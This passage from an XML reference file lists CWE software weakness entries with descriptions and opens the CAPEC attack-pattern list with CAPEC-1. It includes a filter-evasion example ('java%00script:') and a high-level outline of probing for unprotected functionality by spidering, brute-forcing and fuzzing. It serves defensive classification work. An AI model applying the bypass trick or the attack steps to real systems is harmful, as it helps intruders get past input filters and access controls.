  <description>The software receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.Incomplete filtering of this nature involves eitheronly filtering a single instance of a special element when more exist, ornot filtering all instances or all elements where multiple special elements exist.</description>
</vulnerability>
<vulnerability label="CWE-793" name="Only Filtering One Instance of a Special Element" type="Variant" reference="CWE">
  <description>The software receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered.</description>
</vulnerability>
<vulnerability label="CWE-794" name="Incomplete Filtering of Multiple Instances of Special Elements" type="Variant" reference="CWE">
  <description>The software receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.Incomplete filtering of this nature may be applied tosequential elements (special elements that appear next to each other) ornon-sequential elements (special elements that appear multiple times in different locations).</description>
</vulnerability>
<vulnerability label="CWE-795" name="Only Filtering Special Elements at a Specified Location" type="Base" reference="CWE">
  <description>The software receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.A filter might only account for instances of special elements when they occur:relative to a marker (e.g. &quot;at the beginning/end of string; the second argument&quot;), orat an absolute position (e.g. &quot;byte number 10&quot;).This may leave special elements in the data that did not match the filter position, but still may be dangerous.</description>
</vulnerability>
<vulnerability label="CWE-796" name="Only Filtering Special Elements Relative to a Marker" type="Variant" reference="CWE">
  <description>The software receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. &quot;at the beginning/end of a string; the second argument&quot;), thereby missing remaining special elements that may exist before sending it to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-797" name="Only Filtering Special Elements at an Absolute Position" type="Variant" reference="CWE">
  <description>The software receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. &quot;byte number 10&quot;), thereby missing remaining special elements that may exist before sending it to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-798" name="Use of Hard-coded Credentials" type="Base" reference="CWE">
  <description>The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</description>
</vulnerability>
<vulnerability label="CWE-799" name="Improper Control of Interaction Frequency" type="Class" reference="CWE">
  <description>The software does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.This can allow the actor to perform actions more frequently than expected. The actor could be a human or an automated process such as a virus or bot. This could be used to cause a denial of service, compromise program logic (such as limiting humans to a single vote), or other consequences. For example, an authentication routine might not limit the number of times an attacker can guess a password. Or, a web site might conduct a poll but only expect humans to vote a maximum of once a day.</description>
</vulnerability>
<vulnerability label="CWE-8" name="J2EE Misconfiguration: Entity Bean Declared Remote" type="Variant" reference="CWE">
  <description>When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.</description>
</vulnerability>
<vulnerability label="CWE-80" name="Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as &quot;&lt;&quot;, &quot;&gt;&quot;, and &quot;&amp;&quot; that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.</description>
</vulnerability>
<vulnerability label="CWE-804" name="Guessable CAPTCHA" type="Base" reference="CWE">
  <description>The software uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.An automated attacker could bypass the intended protection of the CAPTCHA challenge and perform actions at a higher frequency than humanly possible, such as launching spam attacks.There can be several different causes of a guessable CAPTCHA:An audio or visual image that does not have sufficient distortion from the unobfuscated source image.A question is generated that with a format that can be automatically recognized, such as a math question.A question for which the number of possible answers is limited, such as birth years or favorite sports teams.A general-knowledge or trivia question for which the answer can be accessed using a data base, such as country capitals or popular actors.Other data associated with the CAPTCHA may provide hints about its contents, such as an image whose filename contains the word that is used in the CAPTCHA.</description>
</vulnerability>
<vulnerability label="CWE-805" name="Buffer Access with Incorrect Length Value" type="Base" reference="CWE">
  <description>The software uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.When the length value exceeds the size of the destination, a buffer overflow could occur.</description>
</vulnerability>
<vulnerability label="CWE-806" name="Buffer Access Using Size of Source Buffer" type="Variant" reference="CWE">
  <description>The software uses the size of a source buffer when reading from or writing to a destination buffer, which may cause it to access memory that is outside of the bounds of the buffer.When the size of the destination is smaller than the size of the source, a buffer overflow could occur.</description>
</vulnerability>
<vulnerability label="CWE-807" name="Reliance on Untrusted Inputs in a Security Decision" type="Base" reference="CWE">
  <description>The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism. Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.</description>
</vulnerability>
<vulnerability label="CWE-81" name="Improper Neutralization of Script in an Error Message Web Page" type="Variant" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters that could be interpreted as web-scripting elements when they are sent to an error page.Error pages may include customized 403 Forbidden or 404 Not Found pages.When an attacker can trigger an error that contains unneutralized input, then cross-site scripting attacks may be possible.</description>
</vulnerability>
<vulnerability label="CWE-82" name="Improper Neutralization of Script in Attributes of IMG Tags in a Web Page" type="Variant" reference="CWE">
  <description>The web application does not neutralize or incorrectly neutralizes scripting elements within attributes of HTML IMG tags, such as the src attribute.Attackers can embed XSS exploits into the values for IMG attributes (e.g. SRC) that is streamed and then executed in a victim's browser. Note that when the page is loaded into a user's browsers, the exploit will automatically execute.</description>
</vulnerability>
<vulnerability label="CWE-820" name="Missing Synchronization" type="Base" reference="CWE">
  <description>The software utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource. If access to a shared resource is not synchronized, then the resource may not be in a state that is expected by the software. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.</description>
</vulnerability>
<vulnerability label="CWE-821" name="Incorrect Synchronization" type="Base" reference="CWE">
  <description>The software utilizes a shared resource in a concurrent manner but it does not correctly synchronize access to the resource. If access to a shared resource is not correctly synchronized, then the resource may not be in a state that is expected by the software. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.</description>
</vulnerability>
<vulnerability label="CWE-822" name="Untrusted Pointer Dereference" type="Base" reference="CWE">
  <description>The program obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.An attacker can supply a pointer for memory locations that the program is not expecting. If the pointer is dereferenced for a write operation, the attack might allow modification of critical program state variables, cause a crash, or execute code. If the dereferencing operation is for a read, then the attack might allow reading of sensitive data, cause a crash, or set a program variable to an unexpected value (since the value will be read from an unexpected memory location).There are several variants of this weakness, including but not necessarily limited to:The untrusted value is directly invoked as a function call.In OS kernels or drivers where there is a boundary between &quot;userland&quot; and privileged memory spaces, an untrusted pointer might enter through an API or system call (see CWE-781 for one such example).Inadvertently accepting the value from an untrusted control sphere when it did not have to be accepted as input at all. This might occur when the code was originally developed to be run by a single user in a non-networked environment, and the code is then ported to or otherwise exposed to a networked environment.</description>
</vulnerability>
<vulnerability label="CWE-823" name="Use of Out-of-range Pointer Offset" type="Base" reference="CWE">
  <description>The program performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.While a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous memory used to access an individual array. Programs may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error. If an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the program. As a result, the attack might change the state of the software as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.</description>
</vulnerability>
<vulnerability label="CWE-824" name="Access of Uninitialized Pointer" type="Base" reference="CWE">
  <description>The program accesses or uses a pointer that has not been initialized.If the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the program to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks. Depending on memory layout, associated memory management behaviors, and program operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.</description>
</vulnerability>
<vulnerability label="CWE-825" name="Expired Pointer Dereference" type="Base" reference="CWE">
  <description>The program dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.When a program releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the program to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.</description>
</vulnerability>
<vulnerability label="CWE-826" name="Premature Release of Resource During Expected Lifetime" type="Base" reference="CWE">
  <description>The program releases a resource that is still intended to be used by the program itself or another actor.This weakness focuses on errors in which the program should not release a resource, but performs the release anyway. This is different than a weakness in which the program releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weaknesses, the resource should still be valid upon the subsequent access.When a program releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.</description>
</vulnerability>
<vulnerability label="CWE-827" name="Improper Control of Document Type Definition" type="Base" reference="CWE">
  <description>The software does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the software to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.As DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.For example, the SOAP specification prohibits SOAP messages from containing DTDs.</description>
</vulnerability>
<vulnerability label="CWE-828" name="Signal Handler with Functionality that is not Asynchronous-Safe" type="Base" reference="CWE">
  <description>The software defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.This can lead to an unexpected system state with a variety of potential consequences depending on context, including denial of service and code execution.Signal handlers are typically intended to interrupt normal functionality of a program, or even other signals, in order to notify the process of an event. When a signal handler uses global or static variables, or invokes functions that ultimately depend on such state or its associated metadata, then it could corrupt system state that is being used by normal functionality. This could subject the program to race conditions or other weaknesses that allow an attacker to cause the program state to be corrupted. While denial of service is frequently the consequence, in some cases this weakness could be leveraged for code execution.There are several different scenarios that introduce this issue:Invocation of non-reentrant functions from within the handler. One example is malloc(), which modifies internal global variables as it manages memory. Very few functions are actually reentrant.Code sequences (not necessarily function calls) contain non-atomic use of global variables, or associated metadata or structures, that can be accessed by other functionality of the program, including other signal handlers. Frequently, the same function is registered to handle multiple signals.The signal handler function is intended to run at most one time, but instead it can be invoked multiple times. This could happen by repeated delivery of the same signal, or by delivery of different signals that have the same handler function (CWE-831).Note that in some environments or contexts, it might be possible for the signal handler to be interrupted itself.If both a signal handler and the normal behavior of the software have to operate on the same set of state variables, and a signal is received in the middle of the normal execution's modifications of those variables, the variables may be in an incorrect or corrupt state during signal handler execution, and possibly still incorrect or corrupt upon return.</description>
</vulnerability>
<vulnerability label="CWE-829" name="Inclusion of Functionality from Untrusted Control Sphere" type="Class" reference="CWE">
  <description>The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).</description>
</vulnerability>
<vulnerability label="CWE-83" name="Improper Neutralization of Script in Attributes in a Web Page" type="Variant" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes &quot;javascript:&quot; or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.</description>
</vulnerability>
<vulnerability label="CWE-830" name="Inclusion of Web Functionality from an Untrusted Source" type="Base" reference="CWE">
  <description>The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source.Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted. Even if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.This weakness is common in &quot;mashup&quot; development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '&lt;SCRIPT SRC=&quot;http://other.domain.here&quot;&gt;' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access. Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.</description>
</vulnerability>
<vulnerability label="CWE-831" name="Signal Handler Function Associated with Multiple Signals" type="Base" reference="CWE">
  <description>The software defines a function that is used as a handler for more than one signal.While sometimes intentional and safe, when the same function is used to handle multiple signals, a race condition could occur if the function uses any state outside of its local declaration, such as global variables or non-reentrant functions, or has any side effects.An attacker could send one signal that invokes the handler function; in many OSes, this will typically prevent the same signal from invoking the handler again, at least until the handler function has completed execution. However, the attacker could then send a different signal that is associated with the same handler function. This could interrupt the original handler function while it is still executing. If there is shared state, then the state could be corrupted. This can lead to a variety of potential consequences depending on context, including denial of service and code execution.Another rarely-explored possibility arises when the signal handler is only designed to be executed once (if at all). By sending multiple signals, an attacker could invoke the function more than once. This may generate extra, unintended side effects. A race condition might not even be necessary; the attacker could send one signal, wait until it is handled, then send the other signal.</description>
</vulnerability>
<vulnerability label="CWE-832" name="Unlock of a Resource that is not Locked" type="Base" reference="CWE">
  <description>The software attempts to unlock a resource that is not locked.Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).</description>
</vulnerability>
<vulnerability label="CWE-833" name="Deadlock" type="Base" reference="CWE">
  <description>The software contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.</description>
</vulnerability>
<vulnerability label="CWE-834" name="Excessive Iteration" type="Base" reference="CWE">
  <description>The software performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.If the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the software or its host system; it depends on the amount of resources consumed per iteration.</description>
</vulnerability>
<vulnerability label="CWE-835" name="Loop with Unreachable Exit Condition ('Infinite Loop')" type="Base" reference="CWE">
  <description>The program contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.</description>
</vulnerability>
<vulnerability label="CWE-836" name="Use of Password Hash Instead of Password for Authentication" type="Base" reference="CWE">
  <description>The software records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.</description>
</vulnerability>
<vulnerability label="CWE-837" name="Improper Enforcement of a Single, Unique Action" type="Base" reference="CWE">
  <description>The software requires that an actor should only be able to perform an action once, or to have only one unique action, but the software does not enforce or improperly enforces this restriction.In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to &quot;stuff the ballot box&quot; by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the software.</description>
</vulnerability>
<vulnerability label="CWE-838" name="Inappropriate Encoding for Output Context" type="Base" reference="CWE">
  <description>The software uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.This weakness can cause the downstream component to use a decoding method that produces different data than what the software intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the software. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks. While using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output. For example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding.While web applications have received the most attention for this problem, this weakness could potentially apply to any type of software that uses a communications stream that could support multiple encodings.</description>
</vulnerability>
<vulnerability label="CWE-839" name="Numeric Range Comparison Without Minimum Check" type="Base" reference="CWE">
  <description>The program checks a value to ensure that it does not exceed a maximum, but it does not verify that the value exceeds the minimum.Some programs use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption.The use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.</description>
</vulnerability>
<vulnerability label="CWE-84" name="Improper Neutralization of Encoded URI Schemes in a Web Page" type="Variant" reference="CWE">
  <description>The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.</description>
</vulnerability>
<vulnerability label="CWE-841" name="Improper Enforcement of Behavioral Workflow" type="Base" reference="CWE">
  <description>The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the software or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the software might still perform the transfer.Note that this is different than CWE-696, which focuses on when the software performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence. Workflow-related behaviors include:Steps are performed in the expected order.Required steps are not omitted.Steps are not interrupted.Steps are performed in a timely fashion.</description>
</vulnerability>
<vulnerability label="CWE-842" name="Placement of User into Incorrect Group" type="Base" reference="CWE">
  <description>The software or the administrator places a user into an incorrect group.If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.</description>
</vulnerability>
<vulnerability label="CWE-843" name="Access of Resource Using Incompatible Type ('Type Confusion')" type="Base" reference="CWE">
  <description>The program allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.When the program accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access.While this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways.This weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.</description>
</vulnerability>
<vulnerability label="CWE-85" name="Doubled Character XSS Manipulations" type="Variant" reference="CWE">
  <description>The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.</description>
</vulnerability>
<vulnerability label="CWE-86" name="Improper Neutralization of Invalid Characters in Identifiers in Web Pages" type="Variant" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers. Some web browsers may remove these sequences, resulting in output that may have unintended control implications. For example, the software may attempt to remove a &quot;javascript:&quot; URI scheme, but a &quot;java%00script:&quot; URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.</description>
</vulnerability>
<vulnerability label="CWE-862" name="Missing Authorization" type="Class" reference="CWE">
  <description>The software does not perform an authorization check when an actor attempts to access a resource or perform an action.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</description>
</vulnerability>
<vulnerability label="CWE-863" name="Incorrect Authorization" type="Class" reference="CWE">
  <description>The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks is incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</description>
</vulnerability>
<vulnerability label="CWE-87" name="Improper Neutralization of Alternate XSS Syntax" type="Variant" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.</description>
</vulnerability>
<vulnerability label="CWE-88" name="Argument Injection or Modification" type="Base" reference="CWE">
  <description>The software does not sufficiently delimit the arguments being passed to a component in another control sphere, allowing alternate arguments to be provided, leading to potentially security-relevant changes.</description>
</vulnerability>
<vulnerability label="CWE-89" name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" type="Base" reference="CWE">
  <description>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</description>
</vulnerability>
<vulnerability label="CWE-9" name="J2EE Misconfiguration: Weak Access Permissions for EJB Methods" type="Variant" reference="CWE">
  <description>If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the software system.</description>
</vulnerability>
<vulnerability label="CWE-90" name="Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')" type="Base" reference="CWE">
  <description>The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-91" name="XML Injection (aka Blind XPath Injection)" type="Base" reference="CWE">
  <description>The software does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.Within XML, special elements could include reserved words or characters such as &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&quot;&quot;, and &quot;&amp;&quot;, which could then be used to add new data or modify XML syntax.</description>
</vulnerability>
<vulnerability label="CWE-92" name="DEPRECATED: Improper Sanitization of Custom Special Characters" type="Base" reference="CWE">
  <description>This entry has been deprecated. It originally came from PLOVER, which sometimes defined &quot;other&quot; and &quot;miscellaneous&quot; categories in order to satisfy exhaustiveness requirements for taxonomies. Within the context of CWE, the use of a more abstract entry is preferred in mapping situations. CWE-75 is a more appropriate mapping.</description>
</vulnerability>
<vulnerability label="CWE-93" name="Improper Neutralization of CRLF Sequences ('CRLF Injection')" type="Base" reference="CWE">
  <description>The software uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.</description>
</vulnerability>
<vulnerability label="CWE-94" name="Improper Control of Generation of Code ('Code Injection')" type="Class" reference="CWE">
  <description>The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.When software allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</description>
</vulnerability>
<vulnerability label="CWE-95" name="Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. &quot;eval&quot;).This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.</description>
</vulnerability>
<vulnerability label="CWE-96" name="Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.</description>
</vulnerability>
<vulnerability label="CWE-97" name="Improper Neutralization of Server-Side Includes (SSI) Within a Web Page" type="Variant" reference="CWE">
  <description>The software generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.</description>
</vulnerability>
<vulnerability label="CWE-98" name="Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion')" type="Base" reference="CWE">
  <description>The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in &quot;require,&quot; &quot;include,&quot; or similar functions.In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the software will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.</description>
</vulnerability>
<vulnerability label="CWE-99" name="Improper Control of Resource Identifiers ('Resource Injection')" type="Base" reference="CWE">
  <description>The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.This may enable an attacker to access or modify otherwise protected system resources.</description>
</vulnerability>

<threat label="CAPEC-1" name="Accessing Functionality Not Properly Constrained by ACLs" type="Standard" reference="CAPEC">
  <description>In applications, particularly web applications, access to functionality is mitigated by the authorization framework, whose job it is to map ACLs to elements of the application's functionality; particularly URL's for web apps. In the case that the application deployer failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application or can run queries for data that he is otherwise not supposed to.The attacker surveys the target application, possibly as a valid and authenticated userSpidering web sites for all available linksBrute force guessing of resource namesBrute force guessing of user names / credentialsBrute force guessing of function names / actionsACLs or other access control mechanisms are present in the softwareUser IDs or other credentials are present in the softwareOperating modes with different privileges are present in the softwareAt each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actionsUse the web inventory of all forms and inputs and apply attack data to those inputs.Use a packet sniffer to capture and record network trafficExecute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)Attempts to create a catalog of access mechanisms and data have failed.In the case of web applications, use of a spider or other crawling software can allow an attacker to search for accessible pages not beholden to a security constraint.More generally, noting the target resource accessed upon performing specific actions drives an understanding of the resources accessible from the current context.</description>
</threat>
<threat label="CAPEC-10" name="Buffer Overflow via Environment Variables" type="Detailed" reference="CAPEC">
